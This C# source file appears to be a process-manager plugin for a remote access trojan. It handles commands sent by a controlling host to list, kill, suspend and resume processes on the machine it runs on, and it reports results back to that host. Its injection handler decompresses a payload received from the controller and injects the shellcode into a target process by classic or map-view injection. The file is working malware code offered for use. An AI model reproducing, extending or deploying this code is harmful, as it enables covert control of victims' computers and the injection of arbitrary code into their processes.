using PacketLib;
using PacketLib.Packet;
using PacketLib.Utils;
using System.Threading;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        public static void Main(LoadingAPI loadingAPI)
        {
            switch (loadingAPI.CurrentPacket.PacketType)
            {

                case PacketType.PM_GET_PROCESSES:
                    ProcessManagerPacket processManagerPacket = new ProcessManagerPacket(GetProcesses.GetAllProcesses(), loadingAPI.BaseIp, loadingAPI.HWID);
                    ClientSender(loadingAPI.Host, loadingAPI.Key, processManagerPacket);
                    break;

                case PacketType.PM_KILL_PROCESS:
                    ProcessKillerPacket processToKill = (ProcessKillerPacket)loadingAPI.CurrentPacket;
                    ProcessKillerPacket processKillerPacket = new ProcessKillerPacket(KillProcess.IsKilled(processToKill.processId), processToKill.processId, processToKill.processName, processToKill.rowIndex, loadingAPI.BaseIp, loadingAPI.HWID);
                    ClientSender(loadingAPI.Host, loadingAPI.Key, processKillerPacket);
                    break;

                case PacketType.PM_SUSPEND_PROCESS:
                    SuspendProcessPacket processToSuspend = (SuspendProcessPacket)loadingAPI.CurrentPacket;
                    SuspendProcessPacket suspendProcessPacket = new SuspendProcessPacket(SuspendProcess.IsSuspended(processToSuspend.processId), processToSuspend.processId, processToSuspend.processName, processToSuspend.rowIndex, loadingAPI.BaseIp, loadingAPI.HWID);
                    ClientSender(loadingAPI.Host, loadingAPI.Key, suspendProcessPacket);
                    break;

                case PacketType.PM_RESUME_PROCESS:
                    ResumeProcessPacket processToResume = (ResumeProcessPacket)loadingAPI.CurrentPacket;
                    ResumeProcessPacket resumeProcessPacket = new ResumeProcessPacket(ResumeProcess.IsResumed(processToResume.processId), processToResume.processId, processToResume.processName, processToResume.rowIndex, loadingAPI.BaseIp, loadingAPI.HWID);
                    ClientSender(loadingAPI.Host, loadingAPI.Key, resumeProcessPacket);
                    break;

                case PacketType.PM_INJECT_PROCESS:
                    ProcessInjectionPacket processInjectionPacket = (ProcessInjectionPacket)loadingAPI.CurrentPacket;
                    if (processInjectionPacket.injectionMethod == ProcessInjectionPacket.INJECTION_METHODS.CLASSIC)
                    {
                        ProcessInjection.InjectShellCodeClassicMethod(processInjectionPacket.processId, Compressor.QuickLZ.Decompress(processInjectionPacket.payload));
                    }

                    if (processInjectionPacket.injectionMethod == ProcessInjectionPacket.INJECTION_METHODS.MAP_VIEW)
                    {
                        ProcessInjection.InjectShellCodeMapView(processInjectionPacket.processId, Compressor.QuickLZ.Decompress(processInjectionPacket.payload));
                    }
                    break;

                default:
                    return;
            }
            Miscellaneous.CleanMemory();
        }

        private static void ClientSender(Host host, string key, IPacket packet)
        {
            ClientHandler clientHandler = new ClientHandler(host, key);
            clientHandler.ConnectStart();
            while (!clientHandler.Connected)
                Thread.Sleep(125);

            clientHandler.SendPacket(packet);
        }
    }
}